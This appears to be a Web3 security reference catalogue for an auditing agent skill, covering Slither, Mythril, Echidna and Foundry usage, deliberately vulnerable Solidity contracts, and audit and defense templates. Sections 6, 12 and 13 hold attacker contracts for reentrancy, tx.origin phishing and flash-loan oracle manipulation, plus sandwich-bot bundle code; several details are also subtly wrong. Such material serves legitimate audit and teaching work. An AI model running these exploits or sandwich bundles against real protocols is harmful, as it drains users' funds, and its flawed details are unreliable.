# Blockchain & Web3 Security Payloads / Command & Exploit Catalogue

> Companion to `SKILL.md`. Every command is reproducible on Kali Linux 2025-2 after `pip3 install slither-analyzer mythril` and `curl -L https://foundry.paradigm.xyz | bash`.
>
> Placeholder convention: `0xTarget` is the target contract, `$RPC` is an Ethereum RPC endpoint (Alchemy/Infura/Ankr), `$MAINNET_RPC` is mainnet specifically, `<token>` is an ERC20 address.

---

## 1. Environment Setup (Foundry / Hardhat / Brownie / Anvil Fork)

```bash
# ─── Solidity compiler picker ───
pip3 install solc-select
solc-select install 0.8.24 0.7.6 0.6.12
solc-select use 0.8.24

# ─── Foundry (forge, cast, anvil) ───
curl -L https://foundry.paradigm.xyz | bash
foundryup
forge --version
cast --version
anvil --version

# ─── Hardhat (Node.js) ───
npm install -g hardhat-shorthand
npm install --save-dev hardhat @nomicfoundation/hardhat-toolbox

# ─── Brownie (Python) ───
pip3 install eth-brownie
brownie init my-project

# ─── Ape (Python, modern successor) ───
pip3 install ape
ape plugins install solidity vyper

# ─── Slither + Mythril ───
pip3 install slither-analyzer mythril

# ─── Echidna (Haskell binary) ───
# Download from https://github.com/crytic/echidna/releases
sudo mv echidna /usr/local/bin/
echidna --version

# ─── Manticore ───
pip3 install manticore

# ─── Start a local mainnet fork for PoC work ───
export MAINNET_RPC=https://eth-mainnet.g.alchemy.com/v2/$ALCHEMY_KEY
anvil --fork-url $MAINNET_RPC --fork-block-number 19000000 --port 8545 &
cast chain-id --rpc-url http://localhost:8545   # should echo 1

# ─── Initialize a new forge project ───
forge init my-audit --no-commit
cd my-audit
forge install OpenZeppelin/openzeppelin-contracts --no-commit
forge install Uniswap/v3-core --no-commit
```

---

## 2. Slither Detectors Catalog

```bash
# Full run with default detectors (~90+)
slither .

# Filter out noisy paths (lib, test, script)
slither . --filter-paths "lib|test|script|mocks"

# Exclude noisy detectors
slither . --exclude naming-convention,solhint-version,pragma

# Run a specific detector family
slither . --detect reentrancy,reentrancy-eth,reentrancy-no-eth,reentrancy-unlimited-gas
slither . --detect arithmetic
slither . --detect locked-ether
slither . --detect tx-origin
slither . --detect unchecked-transfer
slither . --detect dangerous-strict-equality
slither . --detect timestamp
slither . --detect assembly
slither . --detect centralized-risk
slither . --detect delegatecall-loop
slither . --detect suicidal

# Print detector help / list all detectors
slither --list-detectors

# JSON output for downstream parsing
slither . --json slither_report.json
jq '.results.detectors[] | select(.impact=="High") | {check, impact, description}' slither_report.json

# Triangulation: Slither's upgradeability checks (UUPS vs transparent proxy)
slither . --detect erc7202
slither . --detect erc4626
slither . --detect uninitialized-state-variable

# Storage layout diff across versions (for upgradeable contracts)
slither-check-upgradeability OldContract.sol NewContract.sol
```

**Detector → SWC ID quick map** (most common):

| Slither Detector | SWC ID | Weakness |
|------------------|--------|----------|
| `reentrancy-eth`, `reentrancy-no-eth` | SWC-107 | Reentrancy |
| `arithmetic` (tx-dependent) | SWC-101 | Integer Overflow/Underflow |
| `tx-origin` | SWC-115 | Authorization through tx.origin |
| `unchecked-transfer` | SWC-105 | Unchecked ERC20 transfer return value |
| `timestamp` | SWC-116 | block.timestamp as randomness |
| `assembly` | SWC-102 | Inline assembly (out of scope for analysis) |
| `suicidal` | SWC-106 | Self-destruct callable by anyone |
| `uninitialized-state-variable` | SWC-109 | Uninitialized storage |
| `locked-ether` | SWC-132 | Ether locked in contract |
| `arbitrary-send` | SWC-105 | Anyone can drain ether |

---

## 3. Mythril Symbolic Execution Patterns

```bash
# Quick mode (fast, shallow)
myth analyze src/Vault.sol --execution-timeout 120 --max-depth 12 --backend mythril

# Deep mode (slow, more counterexamples)
myth analyze src/Vault.sol --execution-timeout 1800 --max-depth 50

# BMC (bounded model checker) backend
myth analyze src/Vault.sol --backend bmc --execution-timeout 600

# Specific modules
myth analyze src/Vault.sol \
  --modules arithmetic,ether_thief,transaction_order_independence,reentrancy

# Against deployed bytecode directly (no source)
myth analyze --rpc https://eth-mainnet.g.alchemy.com/v2/$KEY \
  --address 0xTarget \
  --execution-timeout 1200

# JSON output
myth analyze src/Vault.sol -o json > mythril_vault.json
jq '.issues[] | {swc_id, title, severity, bytecode}' mythril_vault.json

# Trace a specific counterexample
myth analyze src/Vault.sol --verbose \
  --modules reentrancy 2>&1 | tee mythril_trace.log
```

**Mythril module → bug class mapping**:

| Module | Detects |
|--------|---------|
| `arithmetic` | Integer overflow / underflow (SWC-101) |
| `reentrancy` | Reentrancy (SWC-107) |
| `ether_thief` | Unauthorized ether withdrawal |
| `transaction_order_independence` | TOD / frontrunning (SWC-114) |
| `delegatecall_to_untrusted_callee` | Dangerous delegatecall (SWC-112) |
| `unchecked_suicide` | Self-destruct callable by anyone (SWC-106) |
| `state_change_after_external_call` | Reentrancy-style state-after-call |

---

## 4. Echidna Property Testing

Echidna drives a contract with random call sequences and tries to falsify invariants. Invariants are functions named `echidna_*` returning `bool` (true = property holds).

```solidity
// echidna/VaultEchidna.sol
pragma solidity ^0.8.24;
import "../src/Vault.sol";

contract VaultEchidna {
    Vault internal vault;

    constructor() payable {
        vault = new Vault();
        vm.deal(address(this), 100 ether);  // not available in Echidna, see alternative below
    }

    // Invariant 1: total shares never exceed total assets (modulo rounding)
    function echidna_shares_le_assets() public view returns (bool) {
        return vault.totalShares() <= vault.totalAssets() + 1;
    }

    // Invariant 2: no caller can have a negative balance (impossible in Solidity,
    // but check for arithmetic-wrap-induced "negative via overflow")
    function echidna_no_negative_balances() public view returns (bool) {
        // Iterate top callers via storage read (or hardcode a few)
        return true;
    }

    // Invariant 3: the contract balance equals sum of all deposits minus withdrawals
    // (approximate — only true if no external deposits)
    function echidna_accounting_consistent() public view returns (bool) {
        return address(vault).balance == vault.totalAssets();
    }
}
```

```bash
# Run with property mode
echidna-test echidna/VaultEchidna.sol \
  --contract VaultEchidna \
  --test-mode property \
  --test-limit 100000 \
  --seq-len 10 \
  --workers 4 \
  --corpus-dir corpus/ \
  --format text

# Optimization: collect coverage, mutate from corpus on next runs
echidna-test echidna/VaultEchidna.sol \
  --contract VaultEchidna \
  --corpus-dir corpus/ \
  --coverage-dir coverage/

# Use a YAML config for reproducibility
cat <<EOF > echidna.yaml
testMode: property
testLimit: 100000
seqLen: 10
workers: 4
corpusDir: corpus/
coverage: true
sender: ["0x10000", "0x20000", "0x30000"]
EOF
echidna-test echidna/VaultEchidna.sol --config echidna.yaml
```

**Invariant design patterns**:

| Pattern | Example | Catches |
|---------|---------|---------|
| **Accounting invariant** | `totalDeposits == sum(balances)` | Reentrancy, rounding exploits |
| **No-loss round trip** | `deposit(x); withdraw(x)` keeps caller whole | Reentrancy, slippage |
| **Monotonic state** | `nonce` only ever increases | Replay, double-spend |
| **Bound preservation** | `shares <= MAX_SUPPLY` | Overflow |
| **Liveness** | `pendingWithdrawals` always eventually claimable | DoS, stuck funds |

---

## 5. Foundry Fuzzing and Invariant Testing

```solidity
// test/Vault.t.sol
pragma solidity ^0.8.24;
import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultTest is Test {
    Vault public vault;
    address public alice = makeAddr("alice");
    address public bob = makeAddr("bob");

    function setUp() public {
        vault = new Vault();
        vm.deal(alice, 100 ether);
        vm.deal(bob, 100 ether);
    }

    // ─── Stateless fuzz (each call independent) ───
    function testFuzz_DepositIncreasesShares(uint256 amount) public {
        vm.assume(amount > 0 && amount <= 100 ether);
        vm.prank(alice);
        vault.deposit{value: amount}();
        assertEq(vault.sharesOf(alice), amount);
    }

    function testFuzz_RevertOnDepositZero() public {
        vm.expectRevert(Vault.ZeroDeposit.selector);
        vault.deposit{value: 0}();
    }

    function testFuzz_WithdrawReleasesExactBalance(uint256 depositAmt, uint256 withdrawAmt) public {
        vm.assume(depositAmt > 0 && withdrawAmt <= depositAmt);
        vm.startPrank(alice);
        vault.deposit{value: depositAmt}();
        uint256 balBefore = alice.balance;
        vault.withdraw(withdrawAmt);
        assertEq(alice.balance, balBefore + withdrawAmt);
        vm.stopPrank();
    }

    // ─── Stateful invariant (fuzzer runs random sequences) ───
    // The contract "handler" pattern (stateful fuzzing)
    function invariant_TotalSharesNeverNegative() public {
        assertGe(int256(int(vault.totalShares())), 0);
    }

    function invariant_VaultBalanceMatchesAccounting() public {
        assertEq(address(vault).balance, vault.totalAssets());
    }
}
```

```bash
# Run all fuzz tests with verbose output
forge test -vvv --fuzz-runs 10000

# Increase fuzz iterations for production gates
forge config set fuzz.runs 100000
forge config set invariant.runs 256
forge config set invariant.depth 500

# Run invariants only
forge test --match-test invariant_ -vvv

# Pin a specific seed for reproducibility
forge test --fuzz-seed 0x1234 --match-test testFuzz

# Coverage
forge coverage --report lcov
lcov --summary lcov.info
```

**Foundry invariant handler pattern** (stateful fuzzing with constrained inputs):

```solidity
// test/handlers/VaultHandler.sol
contract VaultHandler is Test {
    Vault public vault;
    address[] public actors;

    constructor(Vault _vault) { vault = _vault; }

    function deposit(uint256 actorIndex, uint256 amount) external {
        address actor = actors[actorIndex % actors.length];
        vm.startPrank(actor);
        amount = bound(amount, 0, actor.balance);
        vault.deposit{value: amount}();
        vm.stopPrank();
    }

    function withdraw(uint256 actorIndex, uint256 amount) external {
        address actor = actors[actorIndex % actors.length];
        vm.startPrank(actor);
        amount = bound(amount, 0, vault.sharesOf(actor));
        vault.withdraw(amount);
        vm.stopPrank();
    }
}

// In the test contract:
function invariant_AccountingNeverDrifts() public {
    assertEq(address(vault).balance, vault.totalAssets());
}
```

---

## 6. Common Solidity Vulnerabilities with Exploit Code

### 6.1 Reentrancy (cross-function and cross-contract) — SWC-107

**Vulnerable contract**:

```solidity
pragma solidity ^0.7.6;
// Note: ^0.7.6 has no built-in overflow protection

contract VulnerableVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "no balance");

        // BUG: external call BEFORE state update
        (bool ok, ) = msg.sender.call{value: bal}("");
        require(ok, "send failed");

        balances[msg.sender] = 0;
    }
}
```

**Attacker**:

```solidity
contract ReentrancyAttacker {
    VulnerableVault public vault;

    constructor(address _vault) {
        vault = VulnerableVault(payable(_vault));
    }

    function pwn() external payable {
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }
}
```

**Cross-function reentrancy** — same storage, different functions:

```solidity
contract Vulnerable {
    mapping(address => uint256) public balances;

    function withdraw() external {
        uint256 bal = balances[msg.sender];
        (bool ok, ) = msg.sender.call{value: bal}("");
        require(ok);
        balances[msg.sender] = 0;  // only zeroed AFTER external call
    }

    function balanceOf(address who) external view returns (uint256) {
        return balances[who];
    }
}

// Attacker's receive() can call balanceOf(this) and read the un-zeroed balance
// → use it for an in-flight oracle query or accounting bypass
```

### 6.2 Integer Overflow / Underflow — SWC-101

**Pre-0.8.0 contract (no built-in overflow protection)**:

```solidity
pragma solidity ^0.7.6;

contract TokenStore {
    mapping(address => uint256) public balanceOf;

    function buy(uint256 amount) public payable {
        // BUG: amount * 1 ether wraps around if amount is huge
        uint256 cost = amount * 1 ether;
        require(msg.value >= cost, "insufficient");
        balanceOf[msg.sender] += amount;
    }
}

// PoC: buy(type(uint256).max / 1 ether + 1) → cost wraps to ~0 → pay ~0, get tokens
```

**Modern 0.8+ with `unchecked {}`**:

```solidity
pragma solidity ^0.8.24;

contract Sink {
    mapping(address => uint256) public points;

    function addPoints(uint256 amt) external {
        unchecked {
            points[msg.sender] += amt;  // BUG: silent wrap
        }
    }
}
```

### 6.3 Access Control (missing onlyOwner, tx.origin, delegatecall) — SWC-105 / SWC-115 / SWC-112

**Missing `onlyOwner`**:

```solidity
contract Owner {
    address public owner;
    constructor() { owner = msg.sender; }

    // BUG: no modifier, anyone can self-destruct
    function destroy() external {
        selfdestruct(payable(msg.sender));
    }
}
```

**`tx.origin` phishing** — SWC-115:

```solidity
contract Wallet {
    address public owner = msg.sender;

    function transfer(address to, uint256 amt) external {
        // BUG: tx.origin is the EOA that started the tx chain, not the immediate caller
        require(tx.origin == owner, "not owner");
        payable(to).transfer(amt);
    }
}

// Attacker contract deployed anywhere; once the owner is tricked into
// calling *any* function on AttackerContract, AttackerContract can drain Wallet
contract PhishingAttacker {
    Wallet public wallet;
    constructor(address _w) { wallet = Wallet(payable(_w)); }

    function bait() external {
        wallet.transfer(msg.sender, address(wallet).balance);
    }
}
```

**Dangerous `delegatecall`** — SWC-112:

```solidity
contract Proxy {
    address public implementation;
    address public owner;

    function upgrade(address newImpl) external {
        require(msg.sender == owner);
        implementation = newImpl;
    }

    fallback() external payable {
        // BUG: delegates the call, including the caller's storage context
        (bool ok, ) = implementation.delegatecall(msg.data);
        require(ok);
    }
}

// If implementation is attacker-controlled (e.g., via social engineering of the
// upgrade function), delegatecall lets the implementation mutate Proxy's storage
// arbitrarily — including overwriting `owner`.
```

### 6.4 Front-running / Sandwich Attacks — SWC-114

**Vulnerable swap (no slippage protection)**:

```solidity
contract DumbSwap {
    function swapExactTokensForTokens(
        uint256 amountIn,
        address tokenIn,
        address tokenOut
    ) external returns (uint256) {
        // BUG: no minAmountOut — anyone can sandwich this
        uint256 out = getSpotPrice(tokenIn, tokenOut) * amountIn;
        // ...
        return out;
    }
}
```

**Sandwich attack anatomy**:

```
Mempool sees: Victim swapExactTokensForTokens(100 DAI → ?, no min)
   ↓
1. Attacker front-run: buy WETH with large DAI amount → price up
2. Victim swap executes at inflated price → gets fewer WETH
3. Attacker back-run: sell WETH → price back down, pocket difference
```

**Mitigation**: require `minAmountOut` and revert if not met.

### 6.5 Flash Loan Attacks (Price Oracle Manipulation) — SWC-116 / SWC-105

**Vulnerable oracle (spot price)**:

```solidity
contract LendingProtocol {
    IUniswapV2Pair public pair;  // Uniswap V2 spot
    mapping(address => uint256) public collateral;
    mapping(address => uint256) public debt;

    function getAssetPrice() public view returns (uint256) {
        // BUG: uses spot price, manipulable via flash loan
        (uint112 r0, uint112 r1, ) = pair.getReserves();
        return (r1 * 1e18) / r0;
    }

    function borrow(uint256 amount) external {
        uint256 price = getAssetPrice();
        require(collateral[msg.sender] * price >= amount * 2, "under-collateralized");
        debt[msg.sender] += amount;
        // ...
    }
}
```

**Flash loan attacker (Aave)**:

```solidity
contract FlashLoanOracleAttacker is IFlashLoanReceiver {
    ILendingProtocol public victim;
    IUniswapV2Pair public pair;
    IAavePool public aave;

    function attack() external {
        address[] memory assets = new address[](1);
        assets[0] = WETH;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 100_000 ether;
        aave.flashLoan(address(this), assets, amounts, "");
    }

    function executeOperation(
        address[] calldata, uint256[] calldata amounts,
        uint256[] calldata premiums, address, bytes calldata
    ) external returns (bool) {
        // 1. Dump borrowed WETH into Uniswap pair → spot price spikes
        IERC20(WETH).transfer(address(pair), 50_000 ether);
        pair.swap(0, 25_000_000 ether, address(this), "");

        // 2. Victim uses inflated price → loans us 5M against $1k collateral
        IERC20(COLLATERAL).approve(address(victim), type(uint256).max);
        victim.deposit(1 ether);
        victim.borrow(5_000_000 ether);

        // 3. Reverse the price (sell back), repay Aave
        // ... (sell the borrowed 25M DAI back into WETH, return 100k + premium)

        IERC20(WETH).approve(address(aave), amounts[0] + premiums[0]);
        return true;
    }
}
```

### 6.6 MEV (Arbitrage, Liquidation, Sandwich)

**MEV extraction patterns** (searcher side):

```python
# Python (web3.py) — sandwich bot skeleton
from web3 import Web3

w3 = Web3(Web3.WebsocketProvider("ws://localhost:8546"))
victim_tx = w3.eth.get_transaction(pending_tx_hash)

# Identify frontrun-able swap, build sandwich bundle
front_run = build_swap(victim_token_in, victim_token_out, victim.amount_in * 5)
back_run  = build_swap(victim_token_out, victim_token_in, front_run.amount_out)

# Submit bundle to Flashbots
bundle = [front_run, victim_tx, back_run]
flashbots.simulate_bundle(bundle, target_block)
flashbots.send_bundle(bundle, target_block)
```

**Defense from the protocol side**: enforce `minAmountOut` / slippage on every swap. Don't accept "the spot price is fine" from frontend defaults — propagate user-specified slippage.

### 6.7 Bridge Attacks (Validator Compromise, Signature Replay)

**Vulnerable bridge** (signature replay across chains):

```solidity
contract VulnerableBridge {
    mapping(bytes32 => bool) public processed;

    function release(
        address recipient, uint256 amount,
        uint256 sourceChainId, bytes[] calldata sigs
    ) external {
        // BUG: hash doesn't bind to the destination chain ID
        bytes32 h = keccak256(abi.encode(recipient, amount, sourceChainId));
        require(!processed[h], "already processed");

        // Verify validator sigs
        require(verifySigs(h, sigs), "bad sigs");

        processed[h] = true;
        IERC20(token).transfer(recipient, amount);
    }
}

// Attacker: take a valid (recipient, amount, sourceChainId=1) message from Ethereum
// mainnet, replay it on Polygon (sourceChainId=1 is also Ethereum mainnet's ID)
// → double-spend the bridge on every chain that uses this code.
```

**Nomad-style "any message passes" bug** (root hash initialization):

```solidity
contract VulnerableRootManager {
    bytes32 public committedRoot;

    function process(bytes32[] calldata proof, bytes memory message) external {
        // BUG: committedRoot was initialized to 0x00, and any empty-proof
        //      check passes for that zero root.
        require(MerkleProof.verify(proof, committedRoot, keccak256(message)), "bad proof");
        // Process the message → anyone can copy-paste any message and it passes
    }
}
```

### 6.8 Randomness Manipulation — SWC-116

**Vulnerable lottery**:

```solidity
contract DumbLottery {
    function pickWinner() external view returns (address) {
        // BUG: block.timestamp, block.difficulty, and blockhash are
        //      miner/validator-influenceable and visible to other contracts in the same block.
        uint256 seed = uint256(keccak256(abi.encodePacked(
            block.timestamp,
            block.difficulty,
            msg.sender
        )));
        return players[seed % players.length];
    }
}

// Attacker contract: recompute the same "random" in the same tx, only play if winning.
```

**Mitigation**: Chainlink VRF, or commit-reveal over multiple blocks.

### 6.9 tx.origin Phishing (deeper variant) — SWC-115

```solidity
contract Target {
    address public owner = tx.origin;  // BUG: set in constructor from EOA

    modifier onlyOwner() {
        require(tx.origin == owner, "not owner");  // BUG: tx.origin not msg.sender
        _;
    }

    function withdraw() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
}

// Any contract the owner interacts with can call Target.withdraw()
// because tx.origin == owner for the whole tx chain.
```

### 6.10 Storage Collision in Proxies — SWC-1184 (EIP-1967 / Transparent)

**Vulnerable proxy + implementation**:

```solidity
// Implementation
contract Impl {
    address public owner;     // slot 0
    uint256 public value;     // slot 1

    function setValue(uint256 v) external {
        value = v;
    }
}

// Proxy (naive — does not use EIP-1967 reserved slots)
contract Proxy {
    address public implementation;  // slot 0  ← COLLIDES WITH Impl.owner
    address public admin;           // slot 1  ← COLLIDES WITH Impl.value

    fallback() external payable {
        (bool ok, ) = implementation.delegatecall(msg.data);
        require(ok);
    }
}

// When Impl.setValue(v) runs via delegatecall, it writes to slot 1 — which is
// the proxy's `admin` slot. Attacker can call setValue(payable(attacker))
// → admin overwritten → upgrade proxy → drain.
```

**Fix**: use EIP-1967 reserved storage slots (`bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1)`).

---

## 7. Vyper-Specific Patterns

Vyper is Python-like, deliberately non-Turing-complete, and removes many footguns (no `unchecked`, no inheritance, no inline assembly by default). But the curve pool hack (July 2023) showed Vyper is not immune to compiler bugs.

```vyper
# @version ^0.3.10
from vyper.interfaces import ERC20

balances: HashMap[address, uint256]
nonreentrant: public(bool)  # builtin reentrancy lock state

@external
@nonreentrant  # decorator-style reentrancy lock
def withdraw(amount: uint256):
    assert self.balances[msg.sender] >= amount, "insufficient"
    self.balances[msg.sender] -= amount  # safe underflow (0.3.x checks)
    ERC20(self.token).transfer(msg.sender, amount)

@external
def deposit():
    self.balances[msg.sender] += msg.value
```

**Vyper compiler bugs to watch**:

| Bug | Versions affected | Detector |
|-----|-------------------|----------|
| Reentrancy lock bypass (curve hack) | 0.2.15, 0.3.0 | `vyper --version` < 0.3.10 → upgrade |
| Initialization order | 0.3.0–0.3.7 | Manual review of `__init__` |
| Self-call reentrancy | 0.3.0–0.3.9 | Slither `vyper` mode |

```bash
# Compile + check for warnings
vyper contracts/Token.vy
vyper contracts/Token.vy --verbose

# Slither has experimental Vyper support
slither --vyper contracts/Token.vy
```

---

## 8. Bytecode Decompilation (Dedaub / ethervm.io / heimdall)

When a contract is not verified on Etherscan, you have to reverse from bytecode.

```bash
# Pull the deployed bytecode
cast code 0xTarget --rpc-url $RPC > target.bytecode

# Heimdall (modern, fast, ABI recovery)
heimdall decompile \
  --target target.bytecode \
  --output-dir decompiled/
ls decompiled/
# → Token.sol (best-effort Solidity source)
# → ABI.json
# → decompilation.log

# Dedaub (web UI)
# Paste the bytecode at https://app.dedaub.com/decompile
# Outputs pseudocode + function signatures via 4byte.directory lookup

# ethervm.io (web UI)
# https://ethervm.io/decompile/mainnet/0xTarget

# Lookup unknown function selectors
cast 4byte 0x70a08231   # → "balanceOf(address)"
cast 4byte-decode 0x70a08231 0x0000...0001
```

---

## 9. Mainnet Forking and Replay

```bash
# Anvil fork at a specific block (best practice — reproducibility)
anvil --fork-url $MAINNET_RPC --fork-block-number 19000000 --port 8545 &

# Verify the fork
cast block-number --rpc-url http://localhost:8545   # should echo 19000000
cast balance 0xVitalik --rpc-url http://localhost:8545

# Impersonate any account (no key needed on fork)
cast rpc --rpc-url http://localhost:8545 anvil_impersonateAccount 0xWhale
cast send --rpc-url http://localhost:8545 \
  --from 0xWhale 0xTarget "transfer(address,uint256)" 0xAttacker 1000000

# Reset the fork back to genesis
cast rpc --rpc-url http://localhost:8545 anvil_reset

# Hardhat fork (alternative)
npx hardhat node --fork $MAINNET_RPC --fork-block-number 19000000

# Tenderly (cloud fork — good for sharing with clients)
# https://dashboard.tenderly.co/ → fork → share URL
```

---

## 10. Etherscan / Sourcify Verification Checks

```bash
# Check if a contract is verified on Etherscan
curl "https://api.etherscan.io/api?module=contract&action=getsourcecode&address=0xTarget&apikey=$ETHERSCAN_KEY" \
  | jq '.result[0].SourceCode'

# Compare verified source's compiled bytecode to on-chain runtime
forge inspect src/Vault.sol:Vault irOptimized --optimizer-runs 200 > compiled.json
diff <(cast code 0xTarget --rpc-url $RPC) <(jq -r '.bytecode.object' compiled.json)

# Sourcify (decentralized verification) — preferred for audit trail
curl "https://repo.sourcify.dev/contracts/full_match/1/0xTarget/metadata.json" | jq

# Deploy + verify in one go with Foundry
forge script script/Deploy.s.sol \
  --rpc-url $RPC \
  --private-key $DEPLOYER_KEY \
  --verify \
  --etherscan-api-key $ETHERSCAN_KEY \
  --broadcast

# Re-verify an existing contract on Sourcify
forge verify-contract 0xTarget src/Vault.sol:Vault \
  --verifier sourcify \
  --chain-id 1
```

---

## 11. Audit Report Template

```markdown
# Audit Report: <Protocol Name>
**Date**: 2026-06-16
**Auditor**: kali-claw
**Scope**: src/**/*.sol (12 contracts, 2,341 LOC)
**Methodology**: Slither, Mythril, manual review, Foundry fuzzing (10k runs)

## Executive Summary

- **Critical**: 1
- **High**: 3
- **Medium**: 5
- **Low**: 7
- **Informational**: 12

## Severity Definitions

| Severity | Criteria |
|----------|----------|
| **Critical** | Direct, unconditional loss of funds. Bypass of all auth. |
| **High** | Loss of funds under specific (likely) conditions. Auth bypass with constraints. |
| **Medium** | Loss of funds under unlikely conditions. Functional bug. |
| **Low** | Minor logic issue. Defense-in-depth recommendation. |
| **Informational** | Style, gas optimization, code quality. |

## Findings

### [CRITICAL] Reentrancy in Vault.withdraw() drains all deposits

**Severity**: CRITICAL
**SWC ID**: SWC-107
**Location**: src/Vault.sol:42-58

**Description**:
`Vault.withdraw()` performs an external call to `msg.sender` *before* zeroing
the caller's balance, allowing a malicious contract to re-enter `withdraw()`
and drain the entire vault in a single transaction.

**Impact**:
On mainnet deployment (block 19M, 1,000 ETH TVL), the entire balance is
recoverable by any address. Estimated loss: 1,000 ETH (~$3.5M).

**Proof of Concept**:
File: `test/ReentrancyPoC.t.sol::test_PoC_DrainViaReentrancy`

```bash
forge test --match-test test_PoC_DrainViaReentrancy \
  --fork-url $MAINNET_RPC \
  --fork-block-number 19000000 -vvv
```

**Recommendation**:
1. Apply Checks-Effects-Interactions — zero the balance before the external call.
2. Inherit `ReentrancyGuard` from OpenZeppelin and add `nonReentrant` to every
   external function that performs an external call.
3. Add an invariant test: `forge invariant` that asserts the vault balance
   equals `totalAssets()` after every public function.

**Status**: Fix pending.

---
### [HIGH] ... (next finding)
```

---

## 12. Python Pipeline (web3.py exploit scripting + Brownie harness)

```python
"""
Exploit harness: flash loan + oracle manipulation on a fork.
Run with: brownie run scripts/poc_flash_loan.py
"""
from brownie import FlashLoanAttacker, Vault, accounts, network, web3
from web3 import Web3


def main():
    # Connect to the anvil fork
    network.connect("mainnet-fork")

    # Fork at the block just before the supposed exploit window
    web3.provider.make_request("anvil_reset", [{
        "forking": {
            "jsonRpcUrl": "http://localhost:8545",
            "blockNumber": 19000000,
        }
    }])

    attacker = accounts[0]
    victim = Vault.at("0xTarget")
    print(f"Victim balance before: {victim.balance()/1e18} ETH")

    # Deploy the exploit
    exploit = FlashLoanAttacker.deploy(victim.address, {"from": attacker})

    # Impersonate a whale to fund the attacker (anvil-only)
    whale = "0xWhaleAddress"
    web3.provider.make_request("anvil_impersonateAccount", [whale])

    # Run the exploit
    tx = exploit.attack({"from": attacker})
    print(f"Tx gas used: {tx.gas_used}")

    print(f"Victim balance after: {victim.balance()/1e18} ETH")
    assert victim.balance() == 0, "victim not drained"
    print("[+] PoC successful")
```

```bash
# Run
brownie run scripts/poc_flash_loan.py --network mainnet-fork

# Or with web3.py directly
python3 scripts/poc_flash_loan.py
```

---

## 13. MEV Strategy Review (Flashbots)

```bash
# Submit a bundle to Flashbots Protect (private mempool — no sandwich)
cast send --rpc-url https://rpc.flashbots.net/fast \
  --private-key $PK \
  --value 0 \
  0xTarget "deposit()"

# Inspect historical MEV
# Requires: https://github.com/flashbots/mev-inspect-py
mev inspect 19000000  # block number

# Detect sandwich opportunities on a DEX
# Requires: https://github.com/flashbots/searcher-sponsored-tx
```

```python
# Python: build a sandwich bundle
from flashbots import flashbot
from web3 import Web3
from eth_account import Account

w3 = Web3(Web3.HTTPProvider("http://localhost:8545"))
signer = Account.from_key("0x...")

flashbot(w3, signer)

# Build three signed txs: front-run, victim, back-run
front_run = build_swap_tx(buy=WETH, sell=DAI, amount=large_amount)
back_run  = build_swap_tx(buy=DAI, sell=WETH, amount=large_amount)

bundle = [
    {"signer": signer, "transaction": front_run},
    {"signer": signer, "transaction": back_run},  # victim inserted between by Flashbots
]

# Simulate
block = w3.eth.block_number
sim_result = w3.flashbots.simulate(bundle, target_block_number=block + 1)
print(f"Simulated profit: {sim_result.coinbase_diff / 1e18} ETH")

# Send
bundle_send = w3.flashbots.send_bundle(bundle, target_block_number=block + 1)
```

---

## 14. Defense Patterns (OpenZeppelin wizards, ReentrancyGuard, multisig)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/governance/TimelockController.sol";

contract SecureVault is ReentrancyGuard, AccessControl, UUPSUpgradeable {
    using SafeERC20 for IERC20;

    bytes32 public constant GUARDIAN_ROLE = keccak256("GUARDIAN_ROLE");
    IERC20 public immutable token;
    mapping(address => uint256) public balances;
    uint256 public totalDeposits;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor(IERC20 _token) {
        token = _token;
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _disableInitializers();  // prevent implementation initialization
    }

    function initialize(address admin) external initializer {
        _grantRole(DEFAULT_ADMIN_ROLE, admin);
        _grantRole(GUARDIAN_ROLE, admin);
    }

    function deposit(uint256 amount) external nonReentrant {
        token.safeTransferFrom(msg.sender, address(this), amount);
        balances[msg.sender] += amount;
        totalDeposits += amount;
        emit Deposit(msg.sender, amount);
    }

    function withdraw(uint256 amount) external nonReentrant {
        // ── Checks ──
        require(balances[msg.sender] >= amount, "insufficient");

        // ── Effects ──
        balances[msg.sender] -= amount;
        totalDeposits -= amount;

        // ── Interactions ──
        token.safeTransfer(msg.sender, amount);
        emit Withdrawal(msg.sender, amount);
    }

    // UUPS upgrade gate: only DEFAULT_ADMIN_ROLE + (optionally) timelock
    function _authorizeUpgrade(address) internal override onlyRole(DEFAULT_ADMIN_ROLE) {}

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
}

// Deploy with a Gnosis Safe + 48h TimelockController as admin
// TimelockController: 0x... with minDelay = 2 days
// Safe: 3-of-5 multisig of team members
```

**Gnosis Safe deployment (Defender or CLI)**:

```bash
# Install safe-cli
pip3 install safe-cli

# Create a 3-of-5 Safe on mainnet
safe-cli create --threshold 3 \
  --owners 0xSigner1,0xSigner2,0xSigner3,0xSigner4,0xSigner5 \
  --network mainnet

# Or use Defender (web):
# https://defender.openzeppelin.com/#/safes
```

---

## 15. Quick-Reference Cheat Sheet

```bash
# ─── 30-second triage ───
slither . --exclude naming-conversion,solhint-version
myth analyze src/Vault.sol --execution-timeout 120 --max-depth 12

# ─── Full audit (Slither + Mythril + Echidna + Foundry) ───
slither . --json slither.json
myth analyze src/ --execution-timeout 600 -o json > mythril.json
echidna-test echidna/ContractEchidna.sol --config echidna.yaml
forge test -vvv --fuzz-runs 10000

# ─── Mainnet fork + PoC ───
anvil --fork-url $MAINNET_RPC --fork-block-number 19000000 &
forge test --match-test test_PoC \
  --fork-url http://localhost:8545 \
  --fork-block-number 19000000 -vvvv

# ─── Verify deployed == source ───
diff <(cast code 0xTarget --rpc-url $RPC) \
     <(forge inspect src/Vault.sol:Vault irOptimized | jq -r '.bytecode.object')

# ─── Read state without deploying ───
